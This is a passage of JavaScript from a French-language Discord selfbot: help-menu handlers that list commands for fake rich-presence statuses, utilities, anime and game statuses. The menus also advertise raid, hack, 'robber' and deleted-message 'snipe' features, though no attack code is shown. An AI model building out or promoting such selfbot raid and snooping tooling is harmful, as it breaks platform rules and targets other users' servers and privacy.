                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                else return message.edit(`ガ __**${name} - Help**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}about${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos du self***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}status${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos status***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rpcstatus${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos rpc status***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rpcanime${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos rpc anime***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}samsung${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos Samsung Status***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rpcself${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos rpc selfbots***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rpc${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos rpc***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}hack${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos h4x0r***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}fun${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos fun***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}dev${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos développeurs***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}raid${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos raid***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}tools${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos tools***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}mod${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos modération***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}nsfw${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos NSFW +18***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gen${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche le générateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}texte${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos texte***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}systeme${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos du systeme***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}backup${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche le menu backup***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}guilds${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}friends${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos friends***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}groupes${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos groupes***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}profile${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos du profile***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}antiraid${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos de l'anti raid***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gestion${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos gestion***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}logger${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos du logger***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}robber${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos robber*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}voice${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos voice***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}utiles${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos utiles***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}spotify${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos controleurs spotify***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}notes${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les infos notes***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}customcmd${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les commandes custom***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}update${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche le menu update***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "help2"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Help II」`)
                .setDescription(`${prefix}texte ▸ 𝐭𝐞𝐱𝐭𝐞𝐬
                ${prefix}systeme ▸ 𝐢𝐧𝐟𝐨𝐬 𝐬𝐲𝐬𝐭𝐞𝐦𝐞
                ${prefix}backup ▸ 𝐜𝐦𝐝𝐬 𝐛𝐚𝐜𝐤𝐮𝐩
                ${prefix}guilds ▸ 𝐜𝐦𝐝𝐬 𝐠𝐮𝐢𝐥𝐝𝐬
                ${prefix}friends ▸ 𝐟𝐫𝐢𝐞𝐧𝐝𝐬
                ${prefix}groupes ▸ 𝐜𝐦𝐝𝐬 𝐠𝐫𝐨𝐮𝐩𝐞𝐬
                ${prefix}profile ▸ 𝐜𝐦𝐝𝐬 𝐩𝐫𝐨𝐟𝐢𝐥𝐞
                ${prefix}antiraid ▸ 𝐚𝐧𝐭𝐢𝐫𝐚𝐢𝐝
                ${prefix}gestion ▸ 𝐜𝐦𝐝𝐬 𝐠𝐞𝐬𝐭𝐢𝐨𝐧
                ${prefix}logger ▸ 𝐥𝐨𝐠𝐠𝐞𝐫
                ${prefix}spotify ▸ 𝐜𝐨𝐧𝐭𝐫𝐨𝐥𝐞𝐮𝐫 𝐬𝐩𝐨𝐭𝐢𝐟𝐲
                ${prefix}robber ▸ 𝐫𝐨𝐛𝐛𝐬
                ${prefix}voice ▸ 𝐯𝐨𝐢𝐜𝐞
                ${prefix}utiles ▸ 𝐮𝐭𝐢𝐥𝐞𝐬
                ${prefix}notes ▸ 𝐧𝐨𝐭𝐞𝐬
                ${prefix}customcmd ▸ 𝐜𝐦𝐝𝐬 𝐜𝐮𝐬𝐭𝐨𝐦
                ${prefix}update ▸ 𝐮𝐩𝐝𝐚𝐭𝐞 𝐥𝐞 𝐬𝐞𝐥𝐟`.replaceAll("                ", ""))
                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})
            }

            else if (message.content === prefix + "customcmd"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Custom Commandes」`)
                .setDescription(`${client.commands.map(c => `${prefix}${c.name} ▸ ${c.description || "Aucune description"}`).join('\n')}`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})
                else message.edit(`ガ __**${name} - Custom**__ ガ\n>>> ${client.commands.map(c => `${client.tools === "k3s" ? "" : "\`"}${prefix}${c.name}${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.description || "Aucune description"}**`).join('\n')}`)
            }

            else if (message.content === prefix + "utiles"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Utilies」`)
                .setDescription(`${prefix}adminbots ▸ 𝐋𝐢𝐬𝐭𝐞 𝐛𝐨𝐭𝐬 𝐚𝐝𝐦𝐢𝐧𝐬
                ${prefix}admins ▸ 𝐋𝐢𝐬𝐭𝐞 𝐝𝐞𝐬 𝐚𝐝𝐦𝐢𝐧𝐬
                ${prefix}allbots ▸ 𝐋𝐢𝐬𝐭𝐞 𝐝𝐞𝐬 𝐛𝐨𝐭𝐬
                ${prefix}avatar ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐥'𝐚𝐯𝐚𝐭𝐚𝐫
                ${prefix}banner ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐥𝐚 𝐛𝐚𝐧𝐧𝐢è𝐫𝐞
                ${prefix}encode ▸ 𝐄𝐧𝐜𝐨𝐝𝐞 𝐞𝐧 𝐛𝐚𝐬𝐞𝟔𝟒
                ${prefix}decode ▸ 𝐃𝐞𝐜𝐨𝐝𝐞 𝐞𝐧 𝐛𝐚𝐬𝐞𝟔𝟒
                ${prefix}github ▸ 𝐈𝐧𝐟𝐨𝐬 𝐝'𝐮𝐧 𝐠𝐢𝐭𝐡𝐮𝐛
                ${prefix}google ▸ 𝐑𝐞𝐜𝐡𝐞𝐫𝐜𝐡𝐞 𝐬𝐮𝐫 𝐠𝐨𝐨𝐠𝐥𝐞
                ${prefix}invite ▸ 𝐈𝐧𝐯𝐢𝐭𝐞 𝐮𝐧 𝐛𝐨𝐭
                ${prefix}meteo ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐥𝐚 𝐦𝐞𝐭𝐞𝐨
                ${prefix}npm ▸ 𝐑𝐞𝐜𝐡𝐞𝐫𝐜𝐡𝐞 𝐬𝐮𝐫 𝐧𝐩𝐦
                ${prefix}utiles2 ▸ 𝐬𝐮𝐢𝐭𝐞`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                else message.edit(`ガ __**${name} - Utiles**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}adminbots${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche la liste des bots administrateurs du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}admins${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche la liste des admins (hors bot) du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}allbots${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche la liste de tous les bots du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}avatar (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche la photo de profile d'un utilisateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}banner (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche la bannière d'un utilisateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}encode (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Encode un texte en base64***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}decode (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Decode un texte en base64***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}github (name)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les informations d'un utilisateur github*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}google (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Effectue une recherche google***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}invite (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie le lien d'invitation d'un bot*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}meteo (ville)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche la météo d'une ville/d'un pays*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}npm (module)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Effectue une recherche d'un module NPM*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}osu (pseudo)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche la carte d'un joueur Osu*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}member info (member)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les informations d'un membre***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}user info (member)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les informations d'un utilisateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}role info (role)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les informations concernant un rôle***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}server info${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche les informations d'un serveur discord***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}snipe${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Snipe les messages supprimés (max 10)*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}uptime${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche depuis quand le bot est allumé***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}wallpaper${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie un fond écran aléatoire (peut être NSFW)*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}youtube (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Effectue une recherche sur youtube***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}chatbot (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Parle au chatbot (anglais seulement)*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}translate (code) (text)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Traduis un texte dans une langue*** ${client.premium ? "" : "|「Premium Requis」"}`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "utiles2"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Utilies II」`)
                .setDescription(`${prefix}member info ▸ 𝐈𝐧𝐟𝐨𝐬 𝐝'𝐮𝐧 𝐦𝐞𝐦𝐛𝐫𝐞
                ${prefix}user info ▸ 𝐈𝐧𝐟𝐨𝐬 𝐝'𝐮𝐧 𝐮𝐭𝐢𝐥𝐢𝐬𝐚𝐭𝐞𝐮𝐫
                ${prefix}role info ▸ 𝐈𝐧𝐟𝐨𝐬 𝐝'𝐮𝐧 𝐫𝐨𝐥𝐞
                ${prefix}server info ▸ 𝐈𝐧𝐟𝐨𝐬 𝐝'𝐮𝐧 𝐬𝐞𝐫𝐯𝐞𝐮𝐫
                ${prefix}snipe ▸ 𝐒𝐧𝐢𝐩𝐞 𝐝𝐞𝐬 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬
                ${prefix}uptime ▸ 𝐔𝐩𝐭𝐢𝐦𝐞 𝐝𝐮 𝐛𝐨𝐭
                ${prefix}wallpaper ▸ 𝐄𝐧𝐯𝐨𝐢𝐞 𝐮𝐧 𝐟𝐨𝐧𝐝 𝐝'𝐞𝐜𝐫𝐚𝐧
                ${prefix}youtube ▸ 𝐑𝐞𝐜𝐡𝐞𝐫𝐜𝐡𝐞 𝐬𝐮𝐫 𝐲𝐨𝐮𝐭𝐮𝐛𝐞
                ${prefix}chatbot ▸ 𝐏𝐚𝐫𝐥𝐞 𝐚 𝐥'𝐈𝐀
                ${prefix}translate ▸ 𝐓𝐫𝐚𝐝𝐮𝐢𝐬 𝐮𝐧 𝐭𝐞𝐱𝐭𝐞`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})
            }

            else if (message.content === prefix + "rpcstatus"){
                message.edit(`ガ __**${name} - RPC**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}youtube${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Youtube***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}tiktok${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC TikTok***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}soundcloud${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC SoundCloud***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rspotify${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Spotify***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}deezer${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Deezer***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}ytb music${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Youtube Music***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}twitter${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Twitter***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}instagram${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Instagram***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}telegram${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Telegram***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}stumble guys${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Stumble Guys***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}fall guys${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Fall Guys***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}fortnite${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Fortnite***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rocket${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Rocket League***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}league${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC League of Legends***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}valorant${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Valorant***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}fivem${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC FiveM***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gmod${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Garry's Mod***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gta5${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC GTA V***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gta6${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC GTA VI***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}warzone${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Call of Duty: Warzone***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}vsc${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Visual Studio Code (JS)***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}python${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Visual Studio Code (PY)***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}destiny${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Destiny 2***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}twitch${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Twitch***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}apex${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Apex Legends***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}netflix${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Netflix***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}ph${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC PornHub***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}disney+${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Disney+***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}fifa23${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Fifa 23***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}fc24${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC FC 24***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}ubereats${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Uber Eats***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}photoshop${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Photoshop***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}kali${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Kali Linux***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}arch${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Arch Linux***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "rpcself"){

                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} RPC Self」`)
                .setDescription(`${prefix}1337 ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐮𝐧 𝐑𝐏𝐂 𝟏𝟕𝟕𝟑
                ${prefix}speed ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐮𝐧 𝐑𝐏𝐂 𝐒𝐏𝐄𝐄𝐃
                ${prefix}tomori ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐮𝐧 𝐑𝐏𝐂 𝐓𝐨𝐦𝐨𝐫𝐢 𝐏𝐑𝐎𝐉𝐄𝐂𝐓
                ${prefix}punchnox ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐮𝐧 𝐑𝐏𝐂 𝐏𝐮𝐧𝐜𝐡𝐧𝐨𝐱 𝐏𝐫𝐨𝐣𝐞𝐜𝐭
                ${prefix}wfa ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐮𝐧 𝐑𝐏𝐂 𝐖𝐅𝐀 𝐒𝐞𝐥𝐟𝐛𝐨𝐭
                ${prefix}delta ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐮𝐧 𝐑𝐏𝐂 𝐃𝐞𝐥𝐭𝐚 𝐒𝐞𝐥𝐟𝐛𝐨𝐭
                ${prefix}alucard ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐮𝐧 𝐑𝐏𝐂 𝐀𝐥𝐮𝐜𝐚𝐫𝐝 𝐒𝐞𝐥𝐟𝐛𝐨𝐭`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                else message.edit(`ガ __**${name} - RPC**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}1773${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC 1773***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}speed${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC SPEED***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}tomori${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Tomori PROJECT***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}punchnox${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Punchnox Project***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}wfa${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC WFA Selfbot***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}delta${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Delta Selfbot***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}alucard${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Alucard Selfbot***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "rpc"){

                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} RPC」`)
                .setDescription(`${prefix}rpc save ▸ 𝐂𝐫𝐞𝐞 𝐮𝐧𝐞 𝐬𝐚𝐮𝐯𝐞𝐠𝐚𝐫𝐝𝐞 𝐝𝐮 𝐑𝐏𝐂 𝐚𝐜𝐭𝐮𝐞𝐥
                ${prefix}rpc load ▸ 𝐂𝐡𝐚𝐫𝐠𝐞 𝐥𝐚 𝐬𝐚𝐮𝐯𝐞𝐠𝐚𝐫𝐝𝐞 𝐝'𝐮𝐧 𝐑𝐏𝐂
                ${prefix}rpc date ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐥𝐚 𝐝𝐚𝐭𝐞 𝐚𝐜𝐭𝐮𝐞𝐥𝐥𝐞
                ${prefix}setrpc ▸ 𝐌𝐨𝐝𝐢𝐟𝐢𝐞 𝐯𝐨𝐭𝐫𝐞 𝐑𝐏𝐂 𝐚𝐜𝐭𝐮𝐞𝐥
                ${prefix}multistream ▸ 𝐀𝐜𝐭𝐢𝐯𝐞 𝐥𝐞 𝐦𝐮𝐥𝐭𝐢𝐬𝐭𝐫𝐞𝐚𝐦 𝐝𝐮 𝐜𝐨𝐧𝐟𝐢𝐠`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                else message.edit(`ガ __**${name} - RPC**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}rpc save (id)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée une sauvegarde du RPC actuel***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rpc load (id)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Charge la sauvegarde d'un RPC***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rpc date (stop)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche la date actuelle***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}setrpc${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie votre RPC actuel***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}multistream (stop)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active le multistream du config***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "rpcanime"){
                message.edit(`ガ __**${name} - RPC**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}crunchyroll${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Crunchyroll***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}adn${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Anime Digital Network***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}anime sama${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Anime Sama***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}wakanim${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Wakanim***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}hxh${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Hunter X Hunter***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}black clover${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Black Clover***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}naruto${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Naruto***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}one piece${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC One Piece***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}haikyuu${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Haikyuu***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}cote${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Classroom of the Elite***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}code geass${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Code Geass***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}darling${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Darling in the FranXX***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}sao${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC Sword Art Online***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}ngnl${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC No Game No Life***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}mha${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un RPC My Hero Academia***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "samsung"){
                message.edit(`ガ __**${name} - Status Samsung**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}clash royale${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Clash Royale***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}clash of clans${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Clash of Clans***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}brawl stars${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche un status Brawl Stars***
